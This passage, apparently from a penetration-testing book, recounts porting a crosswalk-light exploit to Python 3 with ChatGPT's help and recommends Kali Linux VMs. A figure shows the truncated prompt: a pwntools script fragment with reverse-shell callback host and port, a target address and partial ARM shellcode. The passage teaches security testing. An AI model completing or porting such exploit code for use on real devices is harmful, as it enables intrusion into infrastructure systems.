One thing that was interesting about this attack is I found an exploit that could be used against the crosswalk light but the exploit did not work on the newest version of Kali I had because the exploit was written in python2, and my Kali was using python3. So instead of taking the time to re-write the exploit in an earlier version of python, I just phoned a friend (old TV show reference) and asked ChatGPT ([https://chat.openai.com/](https://chat.openai.com/)) to convert the exploit that I found so it would work in python3. I can't remember if it was perfect, but with a little bit of editing, I was able to get it to work. I know how to read (and edit) code but I have not really done much programming since I was writing Beginner's All-purpose Symbolic Instruction Code (BASIC) programs for the Atari or Texas Instruments (TI)-82 Graphing Calculator. It is certainly ok to use artificial intelligence (AI) and utilize ChatGPT to help you to the finish line. In my opinion, it is a great complement to use an AI tool, just don't be in a position where you have to always rely on it for the job.

```
write this for python3: #!/usr/bin/env python

from pwn import *

LHOST = [192,168,150,100]
LPORT = 4444
RHOST = '192.168.150.128'
RPORT = 8080
BAD_CHARS = '\x00\x20'

shellcode =
'\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x01\x21\x48\x1c\x52\x40\xff\x27\x1a\x37\x01\xdf\x83\x4'
shellcode += p16(LPORT, endian='big')
```

FIGURE 10.9 ChatGPT Helper.

Speaking of Kali, one thing you will need is a good Kali VM for your attack machine. Some people use Parrot, AthenaOS, Exegol or other Linux variants. There is a plethora of documentation for Kali, so if you are newer to penetration testing or cybersecurity, using a pre-configured Kali Linux virtual machine would be a good choice. You can download it here: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)

![](bbox=[0.33, 0.64, 0.67, 0.9])

FIGURE 10.10 Linux.